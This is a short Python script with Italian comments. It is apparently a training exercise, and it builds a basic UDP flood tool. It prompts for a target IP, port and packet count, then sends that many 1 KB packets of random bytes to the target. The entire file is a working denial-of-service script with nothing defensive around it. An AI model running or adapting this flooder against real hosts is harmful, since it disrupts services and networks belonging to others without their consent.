import socket
import random

# 1. Input dell'IP Target
ip_target = input("Inserisci l'IP della macchina target: ")

# 2. Input della Porta Target
port_target = int(input("Inserisci la porta UDP della macchina target: "))

# 4. Numero di Pacchetti da Inviare
num_packets = int(input("Quanti pacchetti da 1 KB vuoi inviare? "))

# Creazione del socket UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def generate_packet():
    """Genera un pacchetto di 1 KB composto da byte casuali."""
    return bytes(random.getrandbits(8) for _ in range(1024))

# Invio dei pacchetti
for i in range(num_packets):
    packet = generate_packet()
    sock.sendto(packet, (ip_target, port_target))
    print(f"Pacchetto {i+1}/{num_packets} inviato")

print("Tutti i pacchetti sono stati inviati.")
